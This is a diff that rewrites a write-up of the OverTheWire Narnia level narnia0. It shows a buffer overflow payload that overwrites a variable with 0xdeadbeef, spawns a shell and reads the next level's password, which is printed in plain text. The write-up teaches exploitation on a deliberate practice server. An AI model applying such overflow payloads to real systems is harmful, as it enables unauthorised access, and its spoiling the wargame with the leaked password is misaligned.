@@ -1,54 +1,38 @@
-# narnia0 -> narnia1
+
+# narnia0 -> narnia1 Guide
+
+## Connecting to the Server
+Start by connecting to the OverTheWire Narnia game server:
 
 ```bash
-┏━•  ~
-┗  ssh narnia0@narnia.labs.overthewire.org -p 2226
-
-This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
-
-narnia0@narnia.labs.overthewire.org's password:
-Linux narnia 4.18.12 x86_64 GNU/Linux
+> ssh narnia0@narnia.labs.overthewire.org -p 2226
 ```
-... SNIP BANNER ...
 
+## Understanding the Vulnerability
+The source code for the narnia0 program contains a buffer overflow vulnerability:
 ```bash
-narnia0@narnia:~$ cat /narnia/narnia0.c
+> narnia0@narnia:~$ cat /narnia/narnia0.c
 ```
+`/narnia/narnia0.c`
 ```c
-/*                                                                                                                               /*
-  This program is free software; you can redistribute it and/or modify
-  it under the terms of the GNU General Public License as published by
-  the Free Software Foundation; either version 2 of the License, or
-  (at your option) any later version.
-
-  This program is distributed in the hope that it will be useful,
-  but WITHOUT ANY WARRANTY; without even the implied warranty of
-  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-  GNU General Public License for more details.
-
-  You should have received a copy of the GNU General Public License
-  along with this program; if not, write to the Free Software
-  Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
-*/
 #include <stdio.h>
 #include <stdlib.h>
 
-int main(){
-    long val=0x41414141;
+int main() {
+    long val = 0x41414141;
     char buf[20];
 
-    printf("Correct vals value from 0x41414141 -> 0xdeadbeef!\n");
+    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
     printf("Here is your chance: ");
-    scanf("%24s",&buf);
+    scanf("%24s", buf);
 
-    printf("buf: %s\n",buf);
-    printf("val: 0x%08x\n",val);
+    printf("buf: %s\n", buf);
+    printf("val: 0x%08lx\n", val);
 
-    if(val==0xdeadbeef){
-        setreuid(geteuid(),geteuid());
+    if (val == 0xdeadbeef) {
+        setreuid(geteuid(), geteuid());
         system("/bin/sh");
-    }
-    else {
+    } else {
         printf("WAY OFF!!!!\n");
         exit(1);
     }
@@ -57,61 +41,75 @@ int main(){
 }
 ```
 
-We can quickly see our buffer overflow in the code. The input character buffer (`char buf[20];`) has a length of 20 bytes, while the scanf() allows for 24 bytes (`scanf("%24s",&buf);`) of input leaving us 4 bytes to overflow. 
+## Key Points
+* Buffer Size: char buf[20]; allocates 20 bytes for buf.
+* Input Size: scanf("%24s", buf); reads up to 24 bytes into buf, allowing an overflow of 4 bytes.
+* Initial Value: val is initially set to 0x41414141, which corresponds to the string "AAAA".
+* Goal: Modify val to 0xdeadbeef to gain shell access.
 
-Looking at the code, we can see that val is assigned the hexadecimal value 0x41414141 (`long val=0x41414141;`), which, when decoded to a string is `AAAA`. It looks like the program expects the user to enter 20 characters then 0xDEADBEEF.
+## Explanation
+* Buffer Overflow: The mismatch between the buffer size (20 bytes) and the allowed input size (24 bytes) enables overwriting adjacent memory, specifically the val variable.
+* Endianness: On x86 and x86-64 architectures, multi-byte values are stored in little-endian order. Thus, to set val to 0xdeadbeef, the input needs to be provided in reverse order: \xef\xbe\xad\xde.
 
-Lets try running the program with 20 A's to see the output.
+## Demonstrating the Overflow
+Initial Test with 20 A's
+First, test the program with 20 'A's to observe the behavior:
 ```bash
-narnia0@narnia:/narnia$ ./narnia0                                                                                     Correct vals value from 0x41414141 -> 0xdeadbeef!
+narnia0@narnia:/narnia$ ./narnia0
+Correct val's value from 0x41414141 -> 0xdeadbeef!
 Here is your chance: AAAAAAAAAAAAAAAAAAAA
 buf: AAAAAAAAAAAAAAAAAAAA
 val: 0x41414100
 WAY OFF!!!!
 ```
 
-Now lets see what happens if we can change `val` to another value by adding 20 A's and 4 B's.
+Modifying val with 20 A's and 4 B's
+Next, try to change val by adding 20 'A's and 4 'B's:
 ```bash
 narnia0@narnia:/narnia$ ./narnia0
-Correct vals value from 0x41414141 -> 0xdeadbeef!
+Correct val's value from 0x41414141 -> 0xdeadbeef!
 Here is your chance: AAAAAAAAAAAAAAAAAAAABBBB
 buf: AAAAAAAAAAAAAAAAAAAABBBB
 val: 0x42424242
 WAY OFF!!!!
 ```
-It works! We were able to modify `val`.
 
-Now lets try giving the program what it wants. 20 chars, and then 0xdeadbeef. So lets test with the correct payload (i.e. hexstring in reverse 0xefbeadde)
+## Exploiting the Vulnerability
+To exploit the buffer overflow, input 20 'A's followed by the little-endian representation of 0xdeadbeef:
 ```bash
-narnia0@narnia:~$ python -c 'print "A"*20 + "\xef\xbe\xad\xde"' | /narnia/narnia0
-Correct vals value from 0x41414141 -> 0xdeadbeef!
+narnia0@narnia:~$ python -c 'print("A"*20 + "\xef\xbe\xad\xde")' | /narnia/narnia0
+Correct val's value from 0x41414141 -> 0xdeadbeef!
 Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ
 val: 0xdeadbeef
 ```
 
-###### NOTE: You may be wondering why deadbeef is written backwards ("\xef\xbe\xad\xde"). In x86 and x86-64 (and a variety of other hardware), multi-byte values such as addresses are stored in little-endian order, ie. "backwards" from the viewpoint of a person reading it.
-
-Now that we have privilege escilation lets get the password for narnia1 from /etc/narnia_pass/narnia1.
+## Obtaining the narnia1 Password
+With the buffer overflow successful, escalate privileges to read the password for narnia1:
 ```bash
-narnia0@narnia:~$ (python -c 'print "A"*20 + "\xef\xbe\xad\xde"'; echo 'cat /etc/narnia_pass/narnia1') | /narnia/narnia0
-Correct vals value from 0x41414141 -> 0xdeadbeef!
+narnia0@narnia:~$ (python -c 'print("A"*20 + "\xef\xbe\xad\xde")'; echo 'cat /etc/narnia_pass/narnia1') | /narnia/narnia0
+Correct val's value from 0x41414141 -> 0xdeadbeef!
 Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ
 val: 0xdeadbeef
 efeidiedae       # password for narnia1
 ```
 
-Alternatively, print the string, and copy & paste it to get the the narnia1 shell and grab the password from /etc/ manually.
+## Manual Approach
+Alternatively, generate the payload, copy it, and use it manually:
 ```bash
 narnia0@narnia:/narnia$ (echo -e 'AAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde\xaf';cat)
-AAAAAAAAAAAAAAAAAAAAﾭޯ                             # copy this to paste it
+AAAAAAAAAAAAAAAAAAAAﾭޯ
 narnia0@narnia:/narnia$ ./narnia0
-Correct vals value from 0x41414141 -> 0xdeadbeef!
-Here is your chance: AAAAAAAAAAAAAAAAAAAAﾭޯ 
+Correct val's value from 0x41414141 -> 0xdeadbeef!
+Here is your chance: AAAAAAAAAAAAAAAAAAAAﾭޯ
 buf: AAAAAAAAAAAAAAAAAAAAﾭ
-val: 0xdeadbeef                                   # success! 
-$ whoami                                          
-narnia1                                           
+val: 0xdeadbeef
+$ whoami
+narnia1
 $ cat /etc/narnia_pass/narnia1
-efeidiedae                                        # password for narnia1
-$
+efeidiedae       # password for narnia1
 ```
+
+## Summary
+* Vulnerability: Buffer overflow due to scanf allowing more input than the buffer can hold.
+* Exploit: Overwrite val to 0xdeadbeef using crafted input.
+* Result: Gain shell access and retrieve the password for the next level.
